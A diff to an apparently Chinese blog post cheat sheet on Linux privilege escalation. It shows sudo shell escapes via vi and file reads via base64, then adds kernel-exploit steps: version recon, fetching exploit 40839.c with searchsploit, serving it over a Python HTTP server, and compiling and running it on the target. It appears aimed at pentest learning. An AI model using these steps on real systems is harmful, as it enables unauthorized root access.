@@ -112,4 +112,49 @@
 <h3 id="vi"><a href="#vi" class="headerlink" title="vi"></a><code>vi</code></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi</span><br><span class="line">:!bash</span><br></pre></td></tr></table></figure>
 
 <h3 id="base64-1"><a href="#base64-1" class="headerlink" title="base64"></a><code>base64</code></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo base64 &quot;file_to_read&quot; | base64 --decode</span><br></pre></td></tr></table></figure>
+
+<h1 id="Linux-内核提权"><a href="#Linux-内核提权" class="headerlink" title="Linux 内核提权"></a>Linux 内核提权</h1><h3 id="查看-Linux-相关信息"><a href="#查看-Linux-相关信息" class="headerlink" title="查看 Linux 相关信息"></a>查看 Linux 相关信息</h3><ul>
+<li>查看内核版本</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -a </span><br><span class="line">uname -r</span><br><span class="line">cat /proc/version	# 查看 Linux 内核的版本信息及相关的编译信息</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/01/17/privilege-elevation/uname.png" class="" title="uanme">
+
+<ul>
+<li>显示 LSB 版本所有信息</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a  # 系统不一定有该命令</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看 Linux 版本信息</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看 Linux 详细版本信息</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/*-release</span><br></pre></td></tr></table></figure>
+
+<h3 id="searchsploit-利用"><a href="#searchsploit-利用" class="headerlink" title="searchsploit 利用"></a>searchsploit 利用</h3><ul>
+<li>寻找内核版本漏洞</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 6.6.9</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>拷贝漏洞利用脚本到当前文件夹</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 40839.c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用 python 开启原创下载端口</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>登陆靶机下载脚本，根据脚本代码不同，选择不同方式运行<ul>
+<li>sh 脚本文件，赋予权限执行即可</li>
+<li>c 文件，通常是需要 gcc 编译，再给编译后的文件赋予权限，最后执行</li>
+</ul>
+</li>
+</ul>
 </div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2025-01-17</span><i class="fa fa-tag"></i><a class="tag" href="/tags/intranet/" title="intranet">intranet </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2025/01/17/privilege-elevation/,Mini's blog,privilege-elevation,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2025/01/26/password-spray/" title="密码喷洒">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2025/01/13/twig/" title="Twig PHP模版引擎">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
